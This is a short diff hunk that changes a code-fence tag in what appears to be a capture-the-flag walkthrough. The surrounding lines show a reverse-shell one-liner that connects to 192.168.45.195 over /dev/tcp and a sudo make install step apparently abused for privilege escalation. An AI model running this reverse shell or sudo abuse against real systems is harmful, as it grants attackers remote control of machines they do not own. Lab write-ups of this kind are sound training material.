@@ -123,7 +123,7 @@ $ cat shell.sh
 /bin/sh -i >& /dev/tcp/192.168.45.195/22 0>&1
 ```
 set up listener, upload and run the command
-```
+```console
 profiler@spx:~/php-spx$ sudo /usr/bin/make install -C /home/profiler/php-spx
 sudo /usr/bin/make install -C /home/profiler/php-spx
 make: Entering directory '/home/profiler/php-spx'
